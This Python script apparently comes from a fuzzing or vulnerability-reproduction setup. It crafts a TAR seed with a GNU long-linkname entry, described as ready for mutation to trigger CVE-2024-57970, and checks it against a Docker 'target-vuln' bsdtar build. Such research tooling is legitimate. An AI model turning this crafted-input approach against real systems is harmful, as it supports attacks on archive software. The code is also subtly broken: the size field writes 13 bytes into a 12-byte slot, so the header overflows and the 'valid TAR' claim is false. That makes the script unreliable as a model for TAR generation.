#!/usr/bin/env python3
"""Create a valid TAR with GNU long linkname as base seed."""
import struct
import io

def make_tar_header(name: bytes, size: int, typeflag: bytes = b'0', 
                    linkname: bytes = b'', mode: bytes = b'0000644',
                    uid: bytes = b'0000000', gid: bytes = b'0000000',
                    mtime: bytes = b'14000000000') -> bytes:
    """Create a valid TAR header with correct checksum."""
    header = bytearray(512)
    
    # Name (offset 0, 100 bytes)
    header[0:len(name)] = name
    
    # Mode (offset 100, 8 bytes)
    header[100:100+len(mode)] = mode
    header[107] = 0x20  # Space, not null
    
    # UID (offset 108, 8 bytes)
    header[108:108+len(uid)] = uid
    header[115] = 0x20  # Space, not null
    
    # GID (offset 116, 8 bytes)
    header[116:116+len(gid)] = gid
    header[123] = 0x20  # Space, not null
    
    # Size (offset 124, 12 bytes) - octal with trailing space and null
    size_oct = f"{size:011o}\x00 ".encode('ascii')
    header[124:136] = size_oct
    
    # Mtime (offset 136, 12 bytes) - octal with trailing space
    mtime_oct = f"{mtime.decode():011s} ".encode('ascii')
    header[136:148] = mtime_oct
    
    # Checksum (offset 148, 8 bytes) - will be calculated
    header[148:156] = b'        '
    
    # Typeflag (offset 156, 1 byte)
    header[156] = typeflag[0]
    
    # Linkname (offset 157, 100 bytes)
    if linkname:
        header[157:157+len(linkname)] = linkname
    
    # Magic (offset 257, 6 bytes)
    header[257:263] = b'ustar\x00'
    
    # Version (offset 263, 2 bytes)
    header[263:265] = b'00'
    
    # Calculate checksum (sum of all bytes with checksum field as spaces)
    checksum = sum(header)
    checksum_oct = f"{checksum:06o}\x00 ".encode('ascii')
    header[148:156] = checksum_oct
    
    return bytes(header)


def create_gnu_longlink_tar() -> bytes:
    """Create TAR with GNU long linkname that can trigger CVE-2024-57970 when truncated."""
    result = io.BytesIO()
    
    # Part 1: GNU long linkname entry (type='K')
    # The long linkname itself (must be > 100 chars)
    long_linkname = b'A' * 249 + b'\x00'  # 250 bytes, null-terminated
    
    # Create header for the long linkname metadata
    longlink_header = make_tar_header(
        name=b'././@LongLink',
        size=len(long_linkname),
        typeflag=b'K',  # GNU long linkname type
        mode=b'0000000',
        uid=b'0000000',
        gid=b'0000000'
    )
    result.write(longlink_header)
    
    # Write the long linkname data (padded to 512-byte boundary)
    result.write(long_linkname)
    padding = (512 - len(long_linkname) % 512) % 512
    result.write(b'\x00' * padding)
    
    # Part 2: Regular file header that references the long linkname
    file_header = make_tar_header(
        name=b'file.txt',  # Truncated name since we have longlink
        size=5,
        typeflag=b'0',  # Regular file
        mode=b'0000644'
    )
    result.write(file_header)
    
    # Part 3: File content
    file_data = b'TEST\n'
    result.write(file_data)
    padding = (512 - len(file_data) % 512) % 512
    result.write(b'\x00' * padding)
    
    # Part 4: End-of-archive marker (two 512-byte zero blocks)
    result.write(b'\x00' * 1024)
    
    return result.getvalue()

if __name__ == "__main__":
    import sys
    from pathlib import Path
    
    # Create base seed
    tar_bytes = create_gnu_longlink_tar()
    
    # Save to seeds directory
    seeds_dir = Path(__file__).parent
    output_path = seeds_dir / "base.tar"
    output_path.write_bytes(tar_bytes)
    
    print(f"‚úÖ Created base seed: {output_path}")
    print(f"   Size: {len(tar_bytes)} bytes")
    print(f"   Contains GNU long linkname (250 bytes)")
    print(f"   Ready for mutation to trigger CVE-2024-57970")
    
    # Validate with bsdtar (if available)
    try:
        import subprocess
        result = subprocess.run(
            ["docker", "compose", "-f", "../../compose.yml", "run", "--rm", 
             "-v", f"{output_path.absolute()}:/input/test.tar",
             "target-vuln", "/opt/target/bin/bsdtar", "-tf", "/input/test.tar"],
            capture_output=True,
            text=True,
            timeout=5
        )
        print(f"\nüìã Validation (vulnerable version):")
        if result.returncode == 0:
            print("   ‚úÖ TAR is valid and parseable")
        else:
            print(f"   ‚ö†Ô∏è  Exit code: {result.returncode}")
    except Exception as e:
        print(f"\n‚ö†Ô∏è  Could not validate with Docker: {e}")
